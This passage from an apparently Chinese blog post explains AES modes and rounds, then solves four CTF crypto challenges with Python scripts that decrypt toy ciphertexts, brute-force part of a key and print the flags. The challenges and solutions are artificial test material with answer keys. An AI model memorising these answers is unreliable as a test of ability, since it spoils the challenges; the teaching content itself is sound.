<p>… | DD DD DD DD DD DD DD DD | DD DD DD DD 00 00 00 04 | … </p>
</blockquote>
<h4 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h4><p>AES分组加密的加密模式共五种可选加密模式。（如果在加密时使用了某种工作模式，则解密时也必须使用同种工作模式）</p>
<blockquote>
<p><strong>ECB</strong> ( Electronic Codebook Book , 电话本模式 ，默认)<br><strong>CBC</strong> ( Cipher Block Chaining , 密码分组链接模式 )<br>CTR ( Counter , 计算器模式 )<br>CFB ( Cipher FeedBack , 密码反馈模式 )<br>OFB ( Output FeedBack , 输出反馈模式 )</p>
</blockquote>
<p>在CTF中比较常见的为<strong>ECB模式</strong>和<strong>CBC模式</strong>，都属于分组密码算法（分组密码算法有四种模式：CBC/ECB/CFB/OCB），主要介绍下ECB模式和CBC模式。</p>
<h5 id="ECB模式"><a href="#ECB模式" class="headerlink" title="ECB模式"></a>ECB模式</h5><p>ECB模式(电话本)，依次出来一组明文分块，每次使用相同的密钥加密。</p>
<p>其加密模式如下所示，如果加密的明文块内容相同，那么得到的密文块也就会相同，相对来说不够安全，只适用于明文较短时。</p>
<p><img src="/posts/b568ee4f/1.png"></p>
<h5 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h5><p>CBC模式(密文分组链接)，一次处理一组明文分块，每次使用相同的密钥加密。CBC模式主要引用了一个初始化向量(IV)来加强密码的随机性，保证相同明文通过相同密钥的加密结果不同。</p>
<p><img src="/posts/b568ee4f/2.png"></p>
<h3 id="AES加密流程"><a href="#AES加密流程" class="headerlink" title="AES加密流程"></a>AES加密流程</h3><p>简要步骤如下图所示：</p>
<p><img src="/posts/b568ee4f/3.png"></p>
<p>1.将明文按照128bit进行分组，拆分次若干个明文块；</p>
<p>2.按照选择的填充模式对最后一块明文块进行填充；</p>
<p>3.每个明文块利用AES加密器和密钥进行加密，得到对应的密文块；</p>
<p>4.拼接所有的密文块得到最终加密的密文。</p>
<h4 id="AES具体加密流程"><a href="#AES具体加密流程" class="headerlink" title="AES具体加密流程"></a>AES具体加密流程</h4><p>AES算法主要有四个操作处理，分别为 轮密钥加（AddRoundKey）、字节替换（SubBytes）、行位移（ShiftRows）、列混淆（MixColumns）。</p>
<p>在进行加密前，明文和密钥都会分组为16字节(128bit)组成的块，按照自己的先后顺序，自上而下，从左往右依次排列。加密后的密文读取也是按照这个顺序。</p>
<p>(以下多处图片均引自<a href="https://bbs.kanxue.com/thread-253884.htm">https://bbs.kanxue.com/thread-253884.htm</a> 感谢这位师傅的文章 讲解的很详细)</p>
<p><img src="/posts/b568ee4f/4.png"></p>
<p>AES算法在处理轮数上也有点不同，在最后一轮中少了列混淆处理。</p>
<p>初始轮（1）</p>
<ul>
<li>轮密钥加（AddRoundKey）</li>
</ul>
<p>普通轮（N-1)</p>
<ul>
<li>字节替换（SubBytes）</li>
<li>行位移（ShiftRows）</li>
<li>列混淆（MixColumns）</li>
<li>轮密钥加（AddRoundKey）</li>
</ul>
<p>最终轮（1） </p>
<ul>
<li>字节替换 （SubBytes）</li>
<li>行位移 （ShiftRows）</li>
<li>轮密钥加（AddRoundKey）</li>
</ul>
<p><img src="/posts/b568ee4f/5.png"></p>
<h5 id="轮密钥加（AddRoundKey）"><a href="#轮密钥加（AddRoundKey）" class="headerlink" title="轮密钥加（AddRoundKey）"></a>轮密钥加（AddRoundKey）</h5><p>根据传入的轮数 将状态矩阵与对应的W[i]异或，该过程中有两个输入参数，分别为明文和子密钥k  都是128位(bit) [16字节]。</p>
<p><img src="/posts/b568ee4f/6.png"></p>
<h5 id="字节替换（SubBytes）"><a href="#字节替换（SubBytes）" class="headerlink" title="字节替换（SubBytes）"></a>字节替换（SubBytes）</h5><p>AES字节替换  简单说就是一个<strong>查表操作</strong> 。在AES中定义了一个S盒和 逆S盒</p>
<p><img src="/posts/b568ee4f/7.png"></p>
<p><img src="/posts/b568ee4f/8.png"></p>
<p><img src="/posts/b568ee4f/9.png"></p>
<p>如上图 a[0,0]是 0x12  查s盒  [1,2]处 得到 0xC9；a[0,1]是 0xAB  查s盒 [A,B]处 也就是 [10,11] 得到  0x62。</p>
<p>如果是逆s盒 那方法也是相同，以 0xC9为例， 查逆s盒 [C,9] 即 [13,9]，对应表中值为 0x12 </p>
<h5 id="行位移（ShiftRows）"><a href="#行位移（ShiftRows）" class="headerlink" title="行位移（ShiftRows）"></a>行位移（ShiftRows）</h5><p>行位移  将输入的数据作为一个4x4矩阵进行处理  可以理解为 左循环位移 操作</p>
<p>第一行保持不变，第二行左移1字节 ，第三行左移2字节，第四行左移3字节</p>
<p><img src="/posts/b568ee4f/10.png"></p>
<p>逆向行位移</p>
<p>第一行保持不变，第二行右移1字节，第三行右移2字节，第四行右移3字节</p>
<p><img src="/posts/b568ee4f/11.png"></p>
<h5 id="列混淆（MixColumns）"><a href="#列混淆（MixColumns）" class="headerlink" title="列混淆（MixColumns）"></a>列混淆（MixColumns）</h5><p>列混合变换就是矩阵相乘，行位移后的状态矩阵和修补矩阵(fixed matrix) 做矩阵相乘，得出输出列。</p>
<p><img src="/posts/b568ee4f/12.png"></p>
<p>逆向列混淆</p>
<p>在解密的逆向列混淆中 与正向列混淆的 左乘矩阵不同，互为逆矩阵。【即 数据矩阵同时乘这两个矩阵后不会发生变化】</p>
<p><img src="/posts/b568ee4f/13.png"></p>
<h3 id="AES-ECB模式"><a href="#AES-ECB模式" class="headerlink" title="AES-ECB模式"></a>AES-ECB模式</h3><p><img src="/posts/b568ee4f/14.png"></p>
<p>1.明文经过填充后，分为不同的组block，以组的方式对数据进行处理</p>
<p>2.密钥Key对明文块进行块加密，得到密文块</p>
<p>3.密文块拼接后得到加密后的密文</p>
<h3 id="AES-CBC模式"><a href="#AES-CBC模式" class="headerlink" title="AES-CBC模式"></a>AES-CBC模式</h3><h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h4><p><img src="/posts/b568ee4f/15.png"></p>
<p>1.明文经过填充后，分为不同的组block，以组的方式对数据进行处理</p>
<p>2.初始化向量 IV 首先和第一组明文进行 XOR 得到中间值 Midvalue</p>
<p>3.采用密钥Key对中间值Midvalue进行块加密，删除第一组加密的密文</p>
<p>4.第一组加密的密文 作为第二组的初始化向量IV，参与第二组的明文异或操作</p>
<p>5.依次进行块加密，最终将得到的每一块密文拼接成密文</p>
<h4 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h4><p><img src="/posts/b568ee4f/16.png"></p>
<ol>
<li>将密文进行分组，第一组得到的是初始化向量，从第二组开始才是真正的密文</li>
<li>使用加密密钥Key对密文的第一组进行解密，得到中间值Midvalue</li>
<li>中间值Midvalue和IV进行XOR,得到该组的明文</li>
<li>前一块密文是最后一块密文的IV，通过异或中间值得到明文</li>
<li>块全部解密完成后拼接得到明文，密码算法校验明文填充格式是否正确</li>
<li>校验通过得到明文，校验失败则得到密文</li>
</ol>
<h3 id="CTF中的AES题目分析"><a href="#CTF中的AES题目分析" class="headerlink" title="CTF中的AES题目分析"></a>CTF中的AES题目分析</h3><h4 id="1-BabyAES"><a href="#1-BabyAES" class="headerlink" title="1.BabyAES"></a>1.BabyAES</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">c = my_aes.encrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>题目分析： 已知iv  key 密文c  使用AES-CBC模式，全部已知可直接AES解密得到明文flag</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"> </span><br><span class="line">Cipher = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">decrypted = Cipher.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(decrypted)</span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="2-2020年第三届安洵杯-easyaes"><a href="#2-2020年第三届安洵杯-easyaes" class="headerlink" title="2.[2020年第三届安洵杯] easyaes"></a>2.[2020年第三届安洵杯] easyaes</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">l</span>):</span><br><span class="line">    <span class="keyword">return</span> random.getrandbits(l)</span><br><span class="line"><span class="comment"># 求iv  去除掉收尾指定字符串</span></span><br><span class="line">iv = flag.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">16</span>)])</span><br><span class="line">LENGTH = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="comment"># 16字节  所以会使用16个字符或长度为16的字符串做密码</span></span><br><span class="line"><span class="keyword">assert</span> LENGTH == <span class="number">16</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#  32字节 且为4个字符(32bit)的重复  32bit*8</span></span><br><span class="line"><span class="comment"># 每个字节由 2个十六进制字符表示 所以有 32*2=64个十六机制字符</span></span><br><span class="line">hint = os.urandom(<span class="number">4</span>) * <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(hint)^bytes_to_long(key))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64 / 16 =4</span></span><br><span class="line">msg = <span class="string">b&#x27;Welcome, ctfer. Dont try too hard, its no use. Have a good day!!&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypto</span>(<span class="params">message</span>):</span><br><span class="line">    aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 对msg AES加密后 转十六进制后 输出后32位</span></span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(encrypto(msg))[-<span class="number">32</span>:])</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">99748265546679089946917295913637945222843938798184123305418691873367322323659</span></span><br><span class="line"><span class="string">bc03f3ac4ff8064acbcfaf0b0bf2ba7b</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>题目分析：</p>
<p>1.已知key长度为 16位，hint为32字节 且为4个字节的重复(32bit*8)</p>
<p>2.已知明文message 64位</p>
<p>AES-CBC解密流程：<br>msg[0] = decrypt(enc1,key)^iv<br>msg[1] = decrypt(enc2,key)^enc1<br>msg[2] = decrypt(enc3,key)^enc2<br>msg[3] = decrypt(enc4,key)^enc3<br>msg = msg[0]+msg[1]+msg[2]+msg[3]</p>
<p>iv = msg[0] ^ decrypt(enc1,key)<br>enc1 = msg[1] ^ decrypt(enc2,key)<br>enc2 = msg[2] ^ decrypt(enc3,key)<br>enc3 = msg[3] ^ decrypt(enc4,key)</p>
<p>其中 已知如下：<br>1.hint^key = tmp -&gt; key = tmp^hint<br>2.enc4<br>3.msg[0] msg[1] msg[2] msg[3]<br>所以可以推出iv来 得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> binascii, sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="comment"># -----------get key---------</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># tmp = hint ^ key -&gt; key = tmp ^ hint</span></span><br><span class="line">tmp = <span class="number">99748265546679089946917295913637945222843938798184123305418691873367322323659</span></span><br><span class="line"><span class="comment"># hint为32字节 key为16字节  所以异或后 tmp高位就是 hint的高位</span></span><br><span class="line"><span class="comment"># [2:10] 前面有0x 所以从第二位开始取8位</span></span><br><span class="line"><span class="comment"># 32字节 64个十六进制字符</span></span><br><span class="line">hint = <span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(tmp))[<span class="number">2</span>:<span class="number">10</span>] * <span class="number">8</span>, <span class="number">16</span>)</span><br><span class="line">key = long_to_bytes(tmp ^ hint)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ----------get iv-----------</span></span><br><span class="line">msg = <span class="string">b&#x27;Welcome, ctfer. Dont try too hard, its no use. Have a good day!!&#x27;</span></span><br><span class="line">msgs = [msg[ii:(ii + <span class="number">16</span>)] <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">16</span>)]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(msgs)</span><br><span class="line"><span class="comment"># [b&#x27;Welcome, ctfer. &#x27;, b&#x27;Dont try too har&#x27;, b&#x27;d, its no use. H&#x27;, b&#x27;ave a good day!!&#x27;]</span></span><br><span class="line"> </span><br><span class="line">msgs.reverse()</span><br><span class="line"><span class="comment"># msg[3] msg[2] msg[1] msg[0]</span></span><br><span class="line"><span class="comment"># [b&#x27;ave a good day!!&#x27;, b&#x27;d, its no use. H&#x27;, b&#x27;Dont try too har&#x27;, b&#x27;Welcome, ctfer. &#x27;]</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IV = binascii.unhexlify(<span class="string">&#x27;bc03f3ac4ff8064acbcfaf0b0bf2ba7b&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># iv = msg[0] ^ decrypt(enc1,key)</span></span><br><span class="line"><span class="comment"># enc1 = msg[1] ^ decrypt(enc2,key)</span></span><br><span class="line"><span class="comment"># enc2 = msg[2] ^ decrypt(enc3,key)</span></span><br><span class="line"><span class="comment"># enc3 = msg[3] ^ decrypt(enc4,key)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decry</span>(<span class="params">key, IV, ms</span>):</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> strxor(aes.decrypt(IV), ms)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ms <span class="keyword">in</span> msgs:</span><br><span class="line">    IV = decry(key, IV, ms)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span> + IV + <span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h4 id="3-aes"><a href="#3-aes" class="headerlink" title="3.aes"></a>3.aes</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">and</span> flag[-<span class="number">1</span>:] == <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"> </span><br><span class="line">key = <span class="string">b&quot;J1fx2g1jDak1c***&quot;</span></span><br><span class="line">l = <span class="built_in">len</span>(key)</span><br><span class="line"> </span><br><span class="line">message = <span class="string">b&quot;I have had my invitation to this world&#x27;s festival, and thus my life has been blessed&quot;</span> + binascii.unhexlify(hashlib.sha256(key).hexdigest())[:<span class="number">10</span>]</span><br><span class="line"> </span><br><span class="line">iv = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">message = message + <span class="built_in">bytes</span>((l - <span class="built_in">len</span>(message) % l) * <span class="built_in">chr</span>(l - <span class="built_in">len</span>(message) % l), encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(aes.encrypt(message)))</span><br><span class="line"><span class="comment">#******************************************************************************************************************************************************6ece036e495d363b647d7f2749c4c2f3dd78f8637b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#题目及WP来源：https://blog.csdn.net/luochen2436/article/details/125884846</span></span><br><span class="line"><span class="comment">#记录下解题思路学习下</span></span><br></pre></td></tr></table></figure>

<p>题目分析：</p>
<p>1.key后三位未知 可爆破</p>
<p>2.明文message 分3部分 第一部分明文已知，中间部分 10个十六进制字符  后部分为 2个0x02 共192个十六进制字符</p>
<p>message = message + bytes((l - len(message) % l) * chr(l - len(message) % l), encoding = “utf-8”)</p>
<p>即 bytes((16-94)%16 * chr((16-(94%16)))）</p>
<p>= bytes(2 * chr (2) ) -&gt; 0x02 0x02</p>
<p>3.iv = flag[5:-1] 即flag{iv} 求出iv即flag</p>
<p>4.已知明文后21字节 根据分组 每组16字节 所以已知最后一块明文 及 倒数第二块后5字节明文</p>
<p><img src="/posts/b568ee4f/17.png"></p>
<p>在CBC中 与ECB相比 多的部分为IV 异或一步</p>
<p>密文 ^ key (AES_ECB)  ^ IV → 明文</p>
<p>最后一块的明文已知，key 可通过爆破后三位</p>
<p>最后一块的密文为  b”ssed” + binascii.unhexlify(hashlib.sha256(key).hexdigest())[:10] +  bytes((l - len(message) % l) * chr(l - len(message) % l)  如果key已知  则密文也就是已知的</p>
<p>我们还知道倒数第二块中的后5个字节  可以作为最后一次加密的IV 的一部分进行校验，如果结果中包含 已知的5个字节，则说明key正确。</p>
<p>IV = 明文 ^ ( 密文 ^ key )</p>
<p>求得key后 可进而推出 IV 即 flag</p>
<p>Plaintext[0] = Ciphertext[0] ^ key ^ IV</p>
<p>Plaintext[1] = Ciphertext[1] ^ key ^ Ciphertext[0]</p>
<p>Plaintext[2] = Ciphertext[2] ^ key ^ Ciphertext[1]</p>
<p>知道最后一个明文 密文 key 以此反复推出IV</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 1. 生成key字典</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">dic = string.printable[:<span class="number">62</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key_table.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">                key = <span class="string">b&quot;J1fx2g1jDak1c&quot;</span>+i.encode()+j.encode()+k.encode()</span><br><span class="line">                file.write(key+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">file.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 2.爆破key</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">m: <span class="built_in">bytes</span>, c: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(m, c)])</span><br><span class="line"> </span><br><span class="line">enc = binascii.unhexlify(<span class="string">&#x27;5d363b647d7f2749c4c2f3dd78f8637b&#x27;</span>)</span><br><span class="line">five_part = binascii.unhexlify(<span class="string">b&quot;6ece036e49&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;key_table.txt&quot;</span>,<span class="string">&quot;rb+&quot;</span>)</span><br><span class="line">pbar = tqdm(<span class="built_in">range</span>(<span class="number">238328</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    key = i[:<span class="number">16</span>]</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    dec = aes.decrypt(enc)</span><br><span class="line">    <span class="comment"># 最后一块 16个字节 4+10+2</span></span><br><span class="line">    m = <span class="string">b&quot;ssed&quot;</span> +binascii.unhexlify(hashlib.sha256(key).hexdigest())[:<span class="number">10</span>]+<span class="string">b&#x27;\x02\x02&#x27;</span></span><br><span class="line">    xor_result = xor(m,dec)</span><br><span class="line">    pbar.update(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> five_part <span class="keyword">in</span> xor_result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] key:&quot;</span>,key)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">f.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 3.求IV</span></span><br><span class="line">l = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="comment"># 192位</span></span><br><span class="line">message = <span class="string">b&quot;I have had my invitation to this world&#x27;s festival, and thus my life has been blessed&quot;</span> + binascii.unhexlify(hashlib.sha256(key).hexdigest())[:<span class="number">10</span>]</span><br><span class="line">message = message + <span class="built_in">bytes</span>((l - <span class="built_in">len</span>(message) % l) * <span class="built_in">chr</span>(l - <span class="built_in">len</span>(message) % l), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(message),<span class="number">16</span>):</span><br><span class="line">    aes_ecb = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    dec_c = aes_ecb.decrypt(enc)</span><br><span class="line">    enc = xor(message[<span class="built_in">len</span>(message)-i-<span class="number">16</span>:<span class="built_in">len</span>(message)-i],dec_c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span>+enc+<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h4 id="4-moectf-ez-cbc"><a href="#4-moectf-ez-cbc" class="headerlink" title="4.moectf ez_cbc"></a>4.moectf ez_cbc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">  </span><br><span class="line">IV = bytes_to_long(<span class="string">b&#x27;cbc!&#x27;</span>)</span><br><span class="line">K = random.randrange(<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">30</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">7</span>] == <span class="string">b&#x27;moectf&#123;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">  </span><br><span class="line">block_length = <span class="number">4</span></span><br><span class="line">flag = flag + ((block_length - <span class="built_in">len</span>(flag) % block_length) % block_length) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">plain_block = [flag[block_length * i: block_length * (i + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // block_length)]</span><br><span class="line">  </span><br><span class="line">c = []</span><br><span class="line">c0 = (IV ^ bytes_to_long(plain_block[<span class="number">0</span>])) ^ K</span><br><span class="line">c.append(c0)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain_block)-<span class="number">1</span>):</span><br><span class="line">    c.append(c[i] ^ bytes_to_long(plain_block[i+<span class="number">1</span>]) ^ K)</span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[748044282, 2053864743, 734492413, 675117672, 1691099828, 1729574447, 1691102180, 657669994, 1741780405, 842228028, 1909206003, 1797919307]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#  flag 为  moectf&#123;flag&#125;</span></span><br></pre></td></tr></table></figure>

<p>题目分析：</p>
<ol>
<li>IV已知，flag部分已知 moectg{}</li>
<li>block_length =4 且 已知flag前四位为 moec</li>
</ol>
<p>所以可以通过此去恢复K</p>
<p>密文块 = 明文块 ^ iv ^ K</p>
<p>明文块 = 密文块 ^ iv ^ K</p>
<p>K = 密文块 ^ 明文块 ^ iv</p>
<p>K = IV ^ bytes_to_long(plain_block[0]) ^ c[0]</p>
<p>  3.求得K后 进而求得m， m = K ^ c[i] ^ c[i+1]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">c = [<span class="number">748044282</span>, <span class="number">2053864743</span>, <span class="number">734492413</span>, <span class="number">675117672</span>, <span class="number">1691099828</span>, <span class="number">1729574447</span>, <span class="number">1691102180</span>, <span class="number">657669994</span>, <span class="number">1741780405</span>, <span class="number">842228028</span>, <span class="number">1909206003</span>, <span class="number">1797919307</span>]</span><br><span class="line">IV = bytes_to_long(<span class="string">b&#x27;cbc!&#x27;</span>)</span><br><span class="line">block_length = <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&#x27;moectf&#123;&#x27;</span></span><br><span class="line">plain_block = [flag[block_length * i: block_length * (i + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // block_length)]</span><br><span class="line"> </span><br><span class="line">K = IV ^ bytes_to_long(plain_block[<span class="number">0</span>]) ^ c[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(K)</span><br><span class="line"> </span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)-<span class="number">1</span>):</span><br><span class="line">    m += long_to_bytes(c[i]^c[i+<span class="number">1</span>]^K)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;moec&#x27;</span>+m)</span><br><span class="line"><span class="comment"># 580598200</span></span><br><span class="line"><span class="comment"># 